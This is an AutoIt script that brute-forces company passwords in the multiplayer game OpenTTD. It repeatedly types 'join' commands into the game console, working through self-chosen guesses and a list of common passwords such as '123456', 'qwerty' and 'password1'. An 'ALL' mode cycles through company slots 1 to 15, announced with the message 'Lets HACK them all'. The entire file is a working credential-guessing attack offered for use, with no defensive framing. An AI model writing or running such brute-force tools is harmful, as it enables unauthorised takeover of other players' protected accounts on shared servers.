Opt("SendKeyDelay", 5)
HotKeySet('{ESC}', '_ex')
HotKeySet('{F1}', '_que')
HotKeySet('{F4}', '_input') ;RESTART

;====================================================
;========== OPEN CONSOLE BEFORE SCRIPT ==============
;====================================================

Global $i
Global $q

_input()

Func _input()
	$i = InputBox(@ScriptName, 'Open OPENTTD console ( ; ) before script!' & @CRLF & 'Send "ALL" to make it automatic 1-15' & @CRLF & 'Company:', '', '', 290, 160)
	If $i >= 1 And $i <= 15 Then
		ConsoleWrite($i & ' = Valid value')
		$q = $i
	ElseIf $i = 'all' Then
		ConsoleWrite('Lets HACK them all')
		$i = 1
		$q = 15
	Else
		ConsoleWrite($i & ' = Invalid value' & @CRLF & 'EXIT')
		Exit
	EndIf ;==>
	_que()
EndFunc   ;==>_input

While 1
	Sleep(100)
WEnd

Func _pass($i, $pasw)
	WinWaitActive('OpenTTD 1.9.2')
	Send('join ' & $i & ' ' & $pasw & '{ENTER}')
EndFunc   ;==>_pass

Func _que()
	Do
		;my own passw guess
		_pass($i, '159')
		_pass($i, '357')
		_pass($i, '654321')
		_pass($i, '1')
		_pass($i, '123123')
		_pass($i, '123')
		_pass($i, '321')
		_pass($i, '1234')

		;top 10 common passws
		_pass($i, '123456')
		_pass($i, '123456789')
		_pass($i, 'qwerty')
		_pass($i, 'password')
		_pass($i, 'pasw')
		_pass($i, '111111')
		_pass($i, '12345678')
		_pass($i, 'abc123')
		_pass($i, '1234567')
		_pass($i, 'password1')
		_pass($i, '12345')
		If $q = 15 Then
			$i += 1
		EndIf
	Until $i = $q
	_input()
EndFunc   ;==>_que

Func _ex()
	Exit
EndFunc   ;==>_ex
